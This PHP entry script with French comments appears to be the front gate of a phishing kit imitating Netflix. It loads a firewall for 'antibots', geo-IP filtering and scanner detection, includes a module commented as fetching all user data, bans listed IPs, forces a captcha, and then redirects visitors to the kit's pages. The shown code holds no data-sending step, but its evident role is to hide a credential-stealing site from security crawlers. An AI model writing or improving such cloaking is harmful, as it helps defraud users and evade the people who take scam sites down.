<?php
/* OBLIGATOIRE Sinon SITE HS */
if (!defined('ALLOW_INCLUDE')) {
    define('ALLOW_INCLUDE', true);
}

// ── Firewall principal (headers + antibots + géo-IP + scan detection) ──
require_once __DIR__ . '/firewall.php';

// Inclure le fichier de sécurité
require_once './security.php';

// Inclure le gestionnaire d'erreurs
require_once './error_handler.php';

require_once './modules/sessions.php'; /* Récup All données USERS */
require_once './modules/load_config.php';

if (!defined('BANNED_IPS_FILE')) {
    define('BANNED_IPS_FILE', __DIR__ . '/logs/ip_ban.txt');
}

if (!function_exists('getUserIP')) {
function getUserIP(): string {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return trim((string)$_SERVER['HTTP_CF_CONNECTING_IP']);
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', (string)$_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim(reset($ipList));
    }
    return trim((string)($_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN'));
}
}

if (!function_exists('isIpBanned')) {
    function isIpBanned(string $ip, string $banFile): bool {
        if (!file_exists($banFile)) return false;
        $banned_ips = file($banFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        return in_array($ip, $banned_ips, true);
    }
}

$ip = getUserIP();

// Redirection ban.php si l'IP est dans le fichier de bans (double vérification)
if (isIpBanned($ip, BANNED_IPS_FILE)) {
    session_unset();
    session_destroy();
    header("Location: ./pages/ban.php");
    exit;
}

// Vérifier si l'utilisateur a déjà validé le captcha
// Supporte les deux conventions : Netflix (captcha_valide) et déployé (captcha_passed)
if (empty($_SESSION['captcha_valide']) && empty($_SESSION['captcha_passed'])) {
    $currentScript = basename($_SERVER['SCRIPT_NAME']);
    if ($currentScript !== 'captcha.php') {
        header('Location: ./captcha.php');
        exit;
    }
}

header('Location: ./pages/index.php');
exit;
